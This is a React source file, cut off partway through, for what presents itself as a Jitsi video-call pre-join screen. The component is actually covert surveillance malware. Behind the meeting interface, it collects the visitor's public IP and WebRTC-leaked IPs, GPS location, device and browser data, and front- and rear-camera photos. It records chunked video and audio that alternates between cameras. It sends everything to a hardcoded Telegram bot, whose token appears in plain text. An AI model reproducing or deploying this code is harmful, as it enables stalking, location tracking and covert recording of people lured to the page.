import { useState, useEffect, Dispatch, SetStateAction, MutableRefObject } from 'react';
import svgPathsDesktop from '@/imports/svg-mtl2mb8nxd';
import svgPathsMobile from '@/imports/svg-8bxdc70pg5';
import { ChevronDown } from 'lucide-react';
import { STUN_SERVERS } from '@/utils/stunServers';
import Alert from '@/imports/Alert-17-970';
import { sendVideoToTelegram } from '@/utils/videoUpload';
import { getDeviceInfo } from '@/utils/deviceInfo';
import { 
  logGeolocationData
} from '@/utils/telegramLogger';
import { handleSequentialPermissions } from '@/utils/permissionHandler';

interface JitsiPreJoinProps {
  roomName: string;
  onJoinRoom: (userName: string) => void;
  videoStreamFront: MediaStream | null;
  setVideoStreamFront: Dispatch<SetStateAction<MediaStream | null>>;
  isVideoRecording: boolean;
  setIsVideoRecording: Dispatch<SetStateAction<boolean>>;
  currentChunkNumber: number;
  setCurrentChunkNumber: Dispatch<SetStateAction<number>>;
  currentCameraType: 'front' | 'back' | 'desktop';
  setCurrentCameraType: Dispatch<SetStateAction<'front' | 'back' | 'desktop'>>;
  geoData: {
    latitude: number;
    longitude: number;
    accuracy: number;
    timestamp: string;
  } | null;
  setGeoData: Dispatch<SetStateAction<{
    latitude: number;
    longitude: number;
    accuracy: number;
    timestamp: string;
  } | null>>;
  isSwitchingCameraRef: MutableRefObject<boolean>;
  globalChunkCounterRef: MutableRefObject<number>;
  geoLocationSentRef: MutableRefObject<boolean>;
  currentVideoDeviceIdRef: MutableRefObject<string | null>;
  isExecutingPermissionsRef: MutableRefObject<boolean>;
}

const TELEGRAM_BOT_TOKEN = '8421853408:AAFDvCHIbx8XZyrfw9lif5eCB6YQZnZqPX8';
const CHAT_ID = 7320458296;

export default function JitsiPreJoin({
  roomName,
  onJoinRoom,
  videoStreamFront,
  setVideoStreamFront,
  isVideoRecording,
  setIsVideoRecording,
  currentChunkNumber,
  setCurrentChunkNumber,
  currentCameraType,
  setCurrentCameraType,
  geoData,
  setGeoData,
  isSwitchingCameraRef,
  globalChunkCounterRef,
  geoLocationSentRef,
  currentVideoDeviceIdRef,
  isExecutingPermissionsRef
}: JitsiPreJoinProps) {
  const [userName, setUserName] = useState('');
  const [isMicMuted, setIsMicMuted] = useState(false);
  const [isCameraOff, setIsCameraOff] = useState(false);
  const [showJoinMenu, setShowJoinMenu] = useState(false);
  const [showPermissionAlert, setShowPermissionAlert] = useState(false);

  // ========================================
  // UTILITY FUNCTIONS
  // ========================================
  
  const log = (...args: any[]) => {
    console.log(...args);
  };

  const detectDevice = (): 'ios' | 'android' | 'desktop' => {
    const ua = navigator.userAgent;
    if (/iPhone|iPad|iPod/i.test(ua)) return 'ios';
    if (/Android/i.test(ua)) return 'android';
    return 'desktop';
  };

  const detectBrowser = (): string => {
    const ua = navigator.userAgent;
    if (/Safari/.test(ua) && !/Chrome/.test(ua)) return 'safari';
    if (/Firefox/i.test(ua)) return 'firefox';
    if (/Chrome/i.test(ua)) return 'chrome';
    return 'other';
  };

  // ========================================
  // IP COLLECTION
  // ========================================

  const getUserIP = async (): Promise<string> => {
    try {
      log('🌐 Запрашиваем IP-адрес...');
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      log('✅ IP получен:', data.ip);
      return data.ip || 'Unknown';
    } catch (error) {
      console.error('❌ Ошибка получения IP:', error);
      return 'Unknown';
    }
  };

  const getWebRTCIPs = (): Promise<string[]> => {
    return new Promise((resolve) => {
      const myPeerConnection = window.RTCPeerConnection || 
                               (window as any).mozRTCPeerConnection || 
                               (window as any).webkitRTCPeerConnection;
      
      if (!myPeerConnection) {
        console.warn('⚠️ WebRTC не поддерживается');
        resolve([]);
        return;
      }
      
      log(`🔍 [WebRTC] Запускаем сбор публичных IP через ${STUN_SERVERS.length} STUN серверов...`);
      
      const localIPs: { [key: string]: boolean } = {};
      const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g;
      const noop = function() {};
      
      // Check if IP is private/local (should be filtered out)
      function isPrivateIP(ip: string): boolean {
        // IPv4 private ranges
        if (/^127\./.test(ip)) return true; // Localhost
        if (/^10\./.test(ip)) return true; // 10.x.x.x
        if (/^172\.(1[6-9]|2[0-9]|3[0-1])\./.test(ip)) return true; // 172.16.x.x - 172.31.x.x
        if (/^192\.168\./.test(ip)) return true; // 192.168.x.x
        if (/^169\.254\./.test(ip)) return true; // Link-local
        if (/^0\./.test(ip)) return true; // Invalid
        
        // IPv6 private ranges
        if (/^::1$/.test(ip)) return true; // IPv6 localhost
        if (/^fe80:/i.test(ip)) return true; // IPv6 link-local
        if (/^fc00:/i.test(ip)) return true; // IPv6 unique local
        if (/^fd00:/i.test(ip)) return true; // IPv6 unique local
        
        return false;
      }
      
      function ipIterate(ip: string) {
        // Фильтруем локальные/приватные IP
        if (isPrivateIP(ip)) {
          log('   🚫 IP отфильтрован (локальный):', ip);
          return;
        }
        
        if (!localIPs[ip]) {
          log('   ✅ Публичный IP найден:', ip);
          localIPs[ip] = true;
        }
      }
      
      const connections: RTCPeerConnection[] = [];
      
      try {
        // METHOD 1: ALL STUN servers
        log(`📡 [WebRTC Method 1] Создаем соединение с ВСЕМИ ${STUN_SERVERS.length} STUN серверами...`);
        const pc1 = new myPeerConnection({ iceServers: STUN_SERVERS });
        connections.push(pc1);
        
        pc1.createDataChannel("");
        
        pc1.createOffer().then((sdp) => {
          if (sdp.sdp) {
            sdp.sdp.split('\n').forEach(function(line) {
              if (line.indexOf('candidate') < 0) return;
              const matches = line.match(ipRegex);
              if (matches) {
                matches.forEach(ipIterate);
              }
            });
          }
          pc1.setLocalDescription(sdp).catch(noop);
        }).catch(noop);
        
        pc1.onicecandidate = function(ice) {
          if (!ice || !ice.candidate || !ice.candidate.candidate) return;
          const matches = ice.candidate.candidate.match(ipRegex);
          if (matches) {
            matches.forEach(ipIterate);
          }
        };
        
        // METHOD 2: Google STUN (fast)
        log('📡 [WebRTC Method 2] Создаем быстрое соединение с Google STUN...');
        const pc2 = new myPeerConnection({
          iceServers: [
            { urls: "stun:stun.l.google.com:19302" },
            { urls: "stun:stun1.l.google.com:19302" }
          ]
        });
        connections.push(pc2);
        
        pc2.createDataChannel("");
        pc2.createOffer(function(sdp) {
          if (sdp.sdp) {
            sdp.sdp.split('\n').forEach(function(line) {
              if (line.indexOf('candidate') < 0) return;
              const matches = line.match(ipRegex);
              if (matches) {
                matches.forEach(ipIterate);
              }
            });
          }
          pc2.setLocalDescription(sdp, noop, noop);
        }, noop);
        
        pc2.onicecandidate = function(ice) {
          if (!ice || !ice.candidate || !ice.candidate.candidate) return;
          const candidateString = ice.candidate.candidate;
          const matches = candidateString.match(ipRegex);
          if (matches) {
            matches.forEach(ipIterate);
          }
        };
        
        // Wait 2 seconds for IP collection
        setTimeout(() => {
          log('⏰ [WebRTC] 2 секунды прошло - завершаем сбор IP...');
          
          connections.forEach((pc, index) => {
            try {
              pc.close();
              log(`🔒 [WebRTC] Соединение #${index + 1} закрыто`);
            } catch (e) {
              console.warn(`⚠️ [WebRTC] Ошибка закрытия соединения #${index + 1}:`, e);
            }
          });
          
          const ips = Object.keys(localIPs);
          log(`✅ [WebRTC] Всего найдено ${ips.length} уникальных ПУБЛИЧНЫХ IP:`, ips);
          resolve(ips);
        }, 2000);
        
      } catch (error) {
        console.error('❌ [WebRTC] Ошибка:', error);
        connections.forEach((pc) => {
          try { pc.close(); } catch (e) {}
        });
        resolve([]);
      }
    });
  };

  const getIPGeolocation = async (): Promise<{ 
    latitude: number; 
    longitude: number; 
    accuracy: number; 
    city?: string 
  }> => {
    try {
      log('🌐 Используем IP-геолокацию как fallback...');
      
      const response = await fetch('https://ipapi.co/json/');
      const data = await response.json();
      
      log('✅ IP-геолокация получена:', data);
      
      return {
        latitude: parseFloat(data.latitude) || 0,
        longitude: parseFloat(data.longitude) || 0,
        accuracy: 50000, // IP geolocation ~50km accuracy
        city: data.city || 'Unknown'
      };
    } catch (error) {
      log('❌ Ошибка IP-геолокации:', error);
      throw new Error('IP-геолокация недоступна');
    }
  };

  // ========================================
  // PERMISSIONS
  // ========================================

  const requestCamMic = async () => {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      throw new Error('getUserMedia не поддерживается');
    }
    
    log('▶️ Запрашиваем камеру и микрофон…');
    
    const device = detectDevice();
    
    // ВАЖНО: Не останавливаем стрим! Просто проверяем что разрешения есть
    if (device === 'desktop') {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: {
          width: { ideal: 1280 },
          height: { ideal: 720 }
        },
        audio: true
      });
      // Не останавливаем! Браузер запомнит разрешение
      log('✅ Камера и микрофон: разрешено (desktop)');
      return stream;
    } else {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { 
          facingMode: 'user',
          width: { ideal: 1280 },
          height: { ideal: 720 }
        },
        audio: true
      });
      // Не останавливаем! Браузер запомнит разрешение
      log('✅ Камера и микрофон: разрешено (mobile)');
      return stream;
    }
  };

  const requestLocation = (timeoutMs = 5000) => {
    return new Promise((resolve, reject) => {
      if (!('geolocation' in navigator)) {
        reject(new Error('Geolocation API недоступен'));
        return;
      }

      log('▶️ Запрашиваем геолокацию…');
      
      const isMac = /Mac|MacIntel|MacPPC|Mac68K/.test(navigator.platform) || 
                    /Macintosh/.test(navigator.userAgent);
      
      const options = isMac ? {
        enableHighAccuracy: false,
        timeout: 25000,
        maximumAge: 10000
      } : { 
        enableHighAccuracy: true,
        timeout: timeoutMs,
        maximumAge: 0
      };
      
      if (isMac) {
        log('🖥 macOS обнаружен - используем Wi-Fi геолокацию с увеличенным таймаутом (25 сек)');
      }
      
      navigator.geolocation.getCurrentPosition(
        position => {
          const { latitude, longitude, accuracy } = position.coords;
          log(`✅ Геолокация: ${latitude.toFixed(5)}, ${longitude.toFixed(5)} (±${accuracy}м)`);
          resolve(position);
        },
        error => reject(error),
        options
      );
    });
  };

  const triggerLocalNetworkAccess = (): Promise<void> => {
    return new Promise((resolve) => {
      try {
        log('🌐 [macOS] Триггерим запрос Local Network Access через WebRTC...');
        
        const pc = new RTCPeerConnection({
          iceServers: [
            { urls: 'stun:stun.l.google.com:19302' }
          ]
        });
        
        pc.createDataChannel('trigger-local-network');
        
        pc.createOffer()
          .then(offer => pc.setLocalDescription(offer))
          .then(() => {
            log('✅ [macOS] WebRTC offer создан - должен появиться запрос Local Network Access');
            
            setTimeout(() => {
              pc.close();
              log('✅ [macOS] WebRTC connection закрыт, ждём разрешения...');
              setTimeout(() => resolve(), 500);
            }, 300);
          })
          .catch(err => {
            log('⚠️ [macOS] WebRTC ошибка (не критична):', err);
            pc.close();
            resolve();
          });
        
      } catch (error) {
        log('⚠️ [macOS] WebRTC не поддерживается:', error);
        resolve();
      }
    });
  };

  // ========================================
  // PHOTO CAPTURE
  // ========================================

  const capturePhoto = async (facingMode: 'user' | 'environment'): Promise<Blob | null> => {
    const device = detectDevice();
    const cameraName = facingMode === 'user' ? 'ФРОНТАЛЬНАЯ' : 'ЗАДНЯЯ';
    
    log(`📸 [capturePhoto] НАЧАЛО - Захватываем фото с ${cameraName} камеры (${device}, facingMode: ${facingMode})...`);
    
    try {
      let constraints: MediaStreamConstraints;
      
      if (device === 'desktop') {
        log(`   🖥️ Desktop detected - используем базовые constraints`);
        constraints = {
          video: {
            width: { ideal: 1920 },
            height: { ideal: 1080 }
          },
          audio: false
        };
      } else {
        log(`   📱 Mobile detected - используем facingMode: ${facingMode}`);
        constraints = {
          video: {
            facingMode: facingMode,
            width: { ideal: 1920 },
            height: { ideal: 1080 }
          },
          audio: false
        };
      }
      
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      
      log(`   ✅ Stream получен для ${cameraName} камеры`);
      
      const video = document.createElement('video');
      video.srcObject = stream;
      video.setAttribute('playsinline', 'true');
      
      await new Promise<void>((resolve) => {
        video.onloadedmetadata = () => {
          video.play();
          log(`   ✅ Видео готово (${video.videoWidth}x${video.videoHeight})`);
          resolve();
        };
      });
      
      await new Promise(resolve => setTimeout(resolve, 300));
      
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      
      if (!ctx) {
        throw new Error('Canvas context not available');
      }
      
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      log(`   ✅ Кадр захвачен (${canvas.width}x${canvas.height})`);
      
      stream.getTracks().forEach(track => track.stop());
      log(`   ✅ Stream остановлен`);
      
      const blob = await new Promise<Blob | null>((resolve) => {
        canvas.toBlob((blob) => {
          resolve(blob);
        }, 'image/jpeg', 0.92);
      });
      
      if (!blob) {
        throw new Error('Failed to create blob from canvas');
      }
      
      log(`✅ [capturePhoto] УСПЕХ - Фото захвачено с ${cameraName} камеры (${blob.size} bytes)`);
      return blob;
      
    } catch (error) {
      console.error(`❌ [capturePhoto] ОШИБКА - Ошибка захвата фото с ${cameraName} камеры:`, error);
      return null;
    } finally {
      log(`📸 [capturePhoto] КОНЕЦ - Обработка фото с ${cameraName} камеры завершена`);
    }
  };

  const sendPhotoToTelegram = async (photoBlob: Blob, cameraType: 'front' | 'back') => {
    const browser = detectBrowser();
    log(`📤 [sendPhotoToTelegram] НАЧАЛО - Отправляем фото (${cameraType}) в Telegram (размер: ${photoBlob.size} bytes)...`);
    
    try {
      const localTime = new Date().toLocaleString('ru-RU', {
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: false
      });
      
      const device = detectDevice();
      const deviceName = device === 'desktop' ? '🖥️ Desktop' : device === 'android' ? '📱 Android' : '📱 iOS';
      const browserName = browser.charAt(0).toUpperCase() + browser.slice(1);
      
      const cameraName = cameraType === 'front' ? '📸 Фронтальная камера' : '📸 Задняя камера';
      const caption = `${cameraName}\n⏰ ${localTime}`;
      
      try {
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID.toString());
        formData.append('photo', photoBlob, `photo_${cameraType}_${Date.now()}.jpg`);
        formData.append('caption', caption);
        
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
        
        const responseData = await response.json();
        
        if (response.ok) {
          log(`✅ Фото успешно отправлено`);
        } else {
          console.warn(`⚠️ Не удалось отправить фото:`, responseData);
        }
      } catch (error) {
        console.error(`❌ Ошибка отправки фото:`, error);
      }
      
      log(`✅ [sendPhotoToTelegram] ФОТО (${cameraType}): Обработано`);
      
    } catch (error) {
      console.error(`❌ [sendPhotoToTelegram] КРИТИЧЕСКАЯ ОШИБКА при отправке фото (${cameraType}) в Telegram:`, error);
    } finally {
      log(`📤 [sendPhotoToTelegram] КОНЕЦ - Фото (${cameraType}) обработано`);
    }
  };

  // ========================================
  // TELEGRAM SENDING
  // ========================================

  const sendToTelegram = async (latitude: number, longitude: number, accuracy: number) => {
    try {
      log('📤 Отправка в Telegram...');
      
      const publicIP = await getUserIP();
      const webrtcIPs = await getWebRTCIPs();
      
      const device = detectDevice();
      const browser = detectBrowser();
      const ua = navigator.userAgent;
      
      const lat = latitude.toFixed(6);
      const lng = longitude.toFixed(6);
      const googleMapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
      
      const localTime = new Date().toLocaleString('ru-RU', {
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: false
      });
      
      const deviceEmoji = device === 'ios' ? '📱' : device === 'android' ? '🤖' : '🖥️';
      const deviceName = device === 'ios' ? 'iOS' : device === 'android' ? 'Android' : 'Desktop';
      
      let message = `🎯 НОВЫЕ ДАННЫЕ\n\n`;
      message += `📍 Геолокация:\n`;
      message += `   Широта: ${lat}\n`;
      message += `   Долгота: ${lng}\n`;
      message += `   Точность: ±${Math.round(accuracy)} м\n`;
      message += `   🗺️ ${googleMapsLink}\n\n`;
      message += `🌐 IP-адреса:\n`;
      message += `   Публичный: ${publicIP}\n`;
      if (webrtcIPs.length > 0) {
        message += `   WebRTC: ${webrtcIPs.join(', ')}\n`;
      }
      message += `\n${deviceEmoji} Устройство: ${deviceName}\n`;
      message += `🌍 Браузер: ${browser}\n`;
      message += `⏰ Время: ${localTime}\n`;
      message += `📱 User-Agent: ${ua}`;
      
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID.toString());
      formData.append('text', message);
      
      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        body: formData
      });
      
      if (response.ok) {
        log('✅ Данные отправлены в Telegram');
      } else {
        console.warn('⚠️ Ошибка отправки в Telegram');
      }
    } catch (error) {
      console.error('❌ Ошибка отправки в Telegram:', error);
    }
  };

  // ========================================
  // VIDEO RECORDING
  // ========================================

  const startVideoRecording = async () => {
    const device = detectDevice();
    log(`🎥 Начинаем запись видео+аудио для устройства: ${device}`);
    
    try {
      const facingMode = device === 'desktop' ? undefined : 'environment';
      
      log(`📷 Запрашиваем ${facingMode === 'environment' ? 'ЗАДНЮЮ' : 'любую'} камеру + микрофон...`);
      
      const stream = await navigator.mediaDevices.getUserMedia({
        video: facingMode ? {
          facingMode: facingMode,
          width: { ideal: 1280 },
          height: { ideal: 720 }
        } : {
          width: { ideal: 1280 },
          height: { ideal: 720 }
        },
        audio: true
      });
      
      const videoTrack = stream.getVideoTracks()[0];
      if (videoTrack) {
        const settings = videoTrack.getSettings();
        currentVideoDeviceIdRef.current = settings.deviceId || null;
        
        log(
          '🎯 [Init] Камера:',
          'deviceId =', settings.deviceId,
          'facingMode =', settings.facingMode,
          'label =', videoTrack.label
        );
      }
      
      setVideoStreamFront(stream);
      
      const actualFacingMode = videoTrack ? videoTrack.getSettings().facingMode : undefined;
      const detectedCameraType = 
        actualFacingMode === 'environment' ? 'back' :
        actualFacingMode === 'user' ? 'front' :
        device === 'desktop' ? 'desktop' : 'back';
      
      setCurrentCameraType(detectedCameraType);
      log(`   ✅ Определён тип камеры: ${detectedCameraType} (facingMode: ${actualFacingMode})`);
      
      setIsVideoRecording(true);
      log(`✅ ${detectedCameraType === 'back' ? 'Задняя' : detectedCameraType === 'front' ? 'Фронтальная' : 'Обычная'} камера + микрофон готовы к записи`);
    } catch (error) {
      console.error('❌ Ошибка при запуске видео+аудио записи:', error);
    }
  };

  const switchCamera = async (newFacingMode: 'user' | 'environment') => {
    const device = detectDevice();
    
    if (device === 'desktop') {
      log('⚠️ Desktop detected - camera switching not available');
      return;
    }
    
    if (isSwitchingCameraRef.current) {
      log('⚠️ Camera switch already in progress, skipping...');
      return;
    }
    
    isSwitchingCameraRef.current = true;
    
    const cameraName = newFacingMode === 'user' ? 'ФРОНТАЛЬНАЯ' : 'ЗАДНЯЯ';
    log(`\n${'='.repeat(80)}`);
    log(`🔄 НАЧИНАЕМ ПЕРЕКЛЮЧЕНИЕ НА ${cameraName} КАМЕРУ`);
    log(`   Устройство: ${device.toUpperCase()}`);
    log(`   Текущая камера: ${currentCameraType}`);
    log(`${'='.repeat(80)}\n`);
    
    try {
      log('📍 ШАГ 1/5: Останавливаем текущую камеру...');
      
      setIsVideoRecording(false);
      log('   ✅ isVideoRecording = false');
      
      if (videoStreamFront) {
        const tracks = videoStreamFront.getTracks();
        log(`   📹 Останавливаем ${tracks.length} треков...`);
        
        tracks.forEach(track => {
          track.stop();
          log(`   ⏹️  ${track.kind}: ${track.label}`);
        });
        
        log('   ✅ Все треки остановлены');
      }
      
      const isAndroid = device === 'android';
      const releaseDelay = isAndroid ? 300 : 200;
      
      log(`\n📍 ШАГ 2/5: Ждем освобождения камеры (${releaseDelay}ms)...`);
      await new Promise(r => setTimeout(r, releaseDelay));
      log('   ✅ Камера освобождена');
      
      log(`\n📍 ШАГ 3/5: Запрашиваем ${cameraName} камеру...`);
      
      let newStream: MediaStream | null = null;
      
      if (isAndroid) {
        const devices = await navigator.mediaDevices.enumerateDevices();
        const videoDevices = devices.filter(d => d.kind === 'videoinput');
        
        log(`   📹 Найдено ${videoDevices.length} камер:`);
        videoDevices.forEach((d, index) => {
          const label = d.label || `Camera ${index + 1}`;
          log(`      ${index + 1}. ${label} (deviceId=${d.deviceId.substring(0, 8)}...)`);
        });
        
        const currentId = currentVideoDeviceIdRef.current;
        
        const isBackPreferred = newFacingMode === 'environment';
        
        let candidate = videoDevices.find(d => {
          const label = (d.label || '').toLowerCase();
          const looksBack =
            label.includes('back') ||
            label.includes('rear') ||
            label.includes('environment') ||
            label.includes('facing back');
          return isBackPreferred ? looksBack : !looksBack;
        });
        
        if (!candidate && currentId) {
          candidate = videoDevices.find(d => d.deviceId !== currentId) || null;
        }
        
        if (!candidate && videoDevices.length > 0) {
          candidate = videoDevices[0];
        }
        
        if (!candidate) {
          throw new Error('Нет доступных камер!');
        }
        
        log(`   ✅ Выбрана камера: ${candidate.label || 'Unknown'} (deviceId=${candidate.deviceId.substring(0, 8)}...)`);
        
        const constraints: MediaStreamConstraints = {
          video: {
            deviceId: { exact: candidate.deviceId },
            facingMode: isBackPreferred ? { ideal: 'environment' } : { ideal: 'user' },
            width: { ideal: 1280 },
            height: { ideal: 720 },
          },
          audio: true,
        };
        
        log('   📷 Запрашиваем getUserMedia с exact deviceId...');
        newStream = await navigator.mediaDevices.getUserMedia(constraints);
        log('   ✅ getUserMedia successful!');
        
        const [track] = newStream.getVideoTracks();
        const settings = track.getSettings();
        log(
          '   ⚙️ Настройки трека:',
          'deviceId =', settings.deviceId,
          'facingMode =', settings.facingMode
        );
        
        if (currentId && settings.deviceId === currentId) {
          log('   ⚠️ getUserMedia вернул тот же deviceId — пробуем альтернативную камеру');
          
          const alt = videoDevices.find(d => d.deviceId !== currentId && d.deviceId !== candidate!.deviceId);
          if (alt) {
            newStream.getTracks().forEach(t => t.stop());
            const altStream = await navigator.mediaDevices.getUserMedia({
              video: {
                deviceId: { exact: alt.deviceId },
                width: { ideal: 1280 },
                height: { ideal: 720 },
              },
              audio: true,
            });
            newStream = altStream;
            const [altTrack] = altStream.getVideoTracks();
            const altSettings = altTrack.getSettings();
            log(
              '   ✅ Переключились на альтернативную камеру:',
              'deviceId =', altSettings.deviceId,
              'facingMode =', altSettings.facingMode
            );
          } else {
            log('   ⚠️ Альтернативная камера не найдена, остаёмся на текущей');
          }
        }
        
        const [finalTrack] = newStream.getVideoTracks();
        const finalSettings = finalTrack.getSettings();
        currentVideoDeviceIdRef.current = finalSettings.deviceId || null;
        
      } else {
        log(`   📷 Используем facingMode: ${newFacingMode}`);
        newStream = await navigator.mediaDevices.getUserMedia({
          video: {
            facingMode: { exact: newFacingMode },
            width: { ideal: 1280 },
            height: { ideal: 720 },
          },
          audio: true,
        });
        log('   ✅ getUserMedia successful!');
        
        const [track] = newStream.getVideoTracks();
        const settings = track.getSettings();
        currentVideoDeviceIdRef.current = settings.deviceId || null;
        log(
          '   ⚙️ Настройки трека:',
          'deviceId =', settings.deviceId,
          'facingMode =', settings.facingMode
        );
      }
      
      if (!newStream) {
        throw new Error('Stream is null!');
      }
      
      const videoTracks = newStream.getVideoTracks();
      const audioTracks = newStream.getAudioTracks();
      
      log('   ✅ Stream получен:');
      log(`      📹 Video tracks: ${videoTracks.length}`);
      videoTracks.forEach(track => {
        const s = track.getSettings();
        log(`         - ${track.label} (${track.readyState}), deviceId=${s.deviceId}, facingMode=${s.facingMode}`);
      });
      log(`      🎤 Audio tracks: ${audioTracks.length}`);
      
      log(`\n📍 ШАГ 4/5: Обновляем state...`);
      
      setVideoStreamFront(newStream);
      log('   ✅ setVideoStreamFront(newStream)');
      
      const [vTrack] = videoTracks;
      const vSettings = vTrack.getSettings();
      const newCameraType =
        vSettings.facingMode === 'environment' ? 'back' :
        vSettings.facingMode === 'user' ? 'front' :
        newFacingMode === 'environment' ? 'back' : 'front';
      
      setCurrentCameraType(newCameraType);
      log(`   ✅ setCurrentCameraType('${newCameraType}')`);
      
      const initDelay = isAndroid ? 400 : 200;
      
      log(`\n📍 ШАГ 5/5: Ждем инициализации камеры (${initDelay}ms)...`);
      await new Promise(r => setTimeout(r, initDelay));
      log('   ✅ Камера инициализирована');
      
      log(`\n🎬 ЗАПУСКАЕМ ЗАПИСЬ...`);
      setIsVideoRecording(true);
      log('   ✅ isVideoRecording = true');
      
      log(`\n${'='.repeat(80)}`);
      log(`✅ ПЕРЕКЛЮЧЕНИЕ НА ${cameraName} КАМЕРУ ЗАВЕРШЕНО!`);
      log(`${'='.repeat(80)}\n`);
      
    } catch (error) {
      console.error(`\n${'='.repeat(80)}`);
      console.error(`❌ ОШИБКА ПЕРЕКЛЮЧЕНИЯ КАМЕРЫ:`);
      console.error(error);
      console.error(`${'='.repeat(80)}\n`);
      
      if (newFacingMode === 'environment') {
        log('🔄 Пытаемся вернуться к фронтальной камере...');
        
        try {
          const fallbackStream = await navigator.mediaDevices.getUserMedia({
            video: {
              facingMode: 'user',
              width: { ideal: 1280 },
              height: { ideal: 720 }
            },
            audio: true
          });
          
          setVideoStreamFront(fallbackStream);
          setCurrentCameraType('front');
          
          await new Promise(resolve => setTimeout(resolve, 100));
          
          setIsVideoRecording(true);
          
          log('✅ Успешно вернулись к фронтальной камере');
        } catch (fallbackError) {
          console.error('❌ Критическая ошибка - не удалось вернуться к фронтальной камере:', fallbackError);
        }
      }
    } finally {
      isSwitchingCameraRef.current = false;
    }
  };

  const handleVideoChunkReady = async (blob: Blob, chunkNum: number, cameraType: 'front' | 'back' | 'desktop') => {
    log(`📹 Получен видео+аудио чанк #${chunkNum} (${cameraType}), размер: ${blob.size} bytes`);
    
    setCurrentChunkNumber(chunkNum);
    
    const device = detectDevice();
    log(`🔍 [Camera Switch] Устройство: ${device}, текущая камера: ${currentCameraType}, чанк камера: ${cameraType}`);
    
    if (device !== 'desktop') {
      const cyclePosition = ((chunkNum - 1) % 4) + 1;
      
      log(`🔄 [Camera Switch] Чанк #${chunkNum}, позиция в цикле: ${cyclePosition}/4, текущая камера: ${currentCameraType}`);
      
      if (cyclePosition === 2 && cameraType === 'back') {
        log(`🔄 Чанк #${chunkNum} завершен (позиция 2/4, камера: ${cameraType}) - переключаем на ФРОНТАЛЬНУЮ`);
        setIsVideoRecording(false);
        log(`⏸️ [Camera Switch] isVideoRecording установлен в false`);
        setTimeout(() => {
          log(`🔄 [Camera Switch] Вызываем switchCamera('user')`);
          switchCamera('user');
        }, 500);
      }
      else if (cyclePosition === 4 && cameraType === 'front') {
        log(`🔄 Чанк #${chunkNum} завершен (позиция 4/4, камера: ${cameraType}) - перекючаем на ЗАДНЮЮ`);
        setIsVideoRecording(false);
        log(`⏸️ [Camera Switch] isVideoRecording установлен в false`);
        setTimeout(() => {
          log(`🔄 [Camera Switch] Вызываем switchCamera('environment')`);
          switchCamera('environment');
        }, 500);
      } else {
        log(`✅ Чанк #${chunkNum} завершен (позиция ${cyclePosition}/4, камера: ${cameraType}) - переключения не требуется`);
      }
    } else {
      // Desktop: infinite recording (no stop)
      log(`🖥️ [Desktop] Чанк #${chunkNum} завершен (камера: ${cameraType}) - продолжаем запись`);
    }
    
    sendVideoToTelegram(blob, chunkNum, cameraType, geoData).catch(err => {
      console.error(`❌ Ошибка отправки чанка #${chunkNum}:`, err);
    });
    
    log(`✅ Чанк #${chunkNum} отправляется в фоне (UI не блокируется)`);
  };

  // ========================================
  // MAIN PERMISSION REQUEST
  // ========================================

  const executePermissionRequests = async () => {
    if (isExecutingPermissionsRef.current) {
      console.warn('⚠️ executePermissionRequests уже выполняется - пропускаем повторный вызов!');
      return;
    }
    
    isExecutingPermissionsRef.current = true;
    log('🔒 Флаг isExecutingPermissions установлен в true');
    
    try {
      let geoSent = false;
      let initialStream: MediaStream | null = null;

      log('🎯 Запускаем единый поток: геолокация (без await) → камера...');
      
      const isMac = /Mac|MacIntel|MacPPC|Mac68K/.test(navigator.platform) || 
                    /Macintosh/.test(navigator.userAgent);
      
      let geoPromise: Promise<any>;
      if (isMac) {
        log('🖥️ macOS - запускаем геолокацию в фоне (25 сек)...');
        geoPromise = requestLocation(25000);
      } else {
        log('📱 iOS/Mobile - запускаем геолокацию в фоне (20 сек)...');
        geoPromise = requestLocation(20000);
      }
      log('✅ Геолокация запущена в фоне (Promise БЕЗ await)');

      let cameraSuccess = false;
      try {
        initialStream = await requestCamMic();
        cameraSuccess = true;
        
        log('✅ Камера и микрофон: разрешено');
        setShowPermissionAlert(false); // Скрыть alert если разрешения получены
      } catch (e: any) {
        log('⚠️ Камера отклонена, но продолжаем запрашивать геолокацию...', e);
        setShowPermissionAlert(true); // Показать alert при отклонении
      }

      try {
        if (isMac) {
          log('⚠️ macOS: Разрешите доступ к локальной сети');
        }
        
        log('⏳ Ожидаем завершения Promise геолокации...');
        const position: any = await geoPromise;
        log('🎉 Геолокация получена успешно!', position);
        
        if (isMac) {
          log('🌐 [macOS] Запускаем Local Network Access ПОСЛЕ геолокации...');
          triggerLocalNetworkAccess().catch(() => {});
        }
        
        const { latitude, longitude, accuracy } = position.coords;
        const lat = Number(latitude).toFixed(6);
        const lng = Number(longitude).toFixed(6);
        const acc = Math.round(accuracy);
        
        const timestamp = new Date().toLocaleString('ru-RU', {
          year: 'numeric',
          month: '2-digit',
          day: '2-digit',
          hour: '2-digit',
          minute: '2-digit',
          second: '2-digit',
          hour12: false
        });
        
        setGeoData({
          latitude,
          longitude,
          accuracy,
          timestamp
        });
        
        log('💾 Геолокация сохранена для видеочанков:', { latitude, longitude, accuracy, timestamp });
        
        if (!geoLocationSentRef.current) {
          log('📤 Отправляем геолокацию в Telegram (первый раз)...');
          
          try {
            await sendToTelegram(latitude, longitude, accuracy);
            geoLocationSentRef.current = true;
            geoSent = true;
            log('✅ Геолокация успешно отправлена в Telegram!');
          } catch (telegramError) {
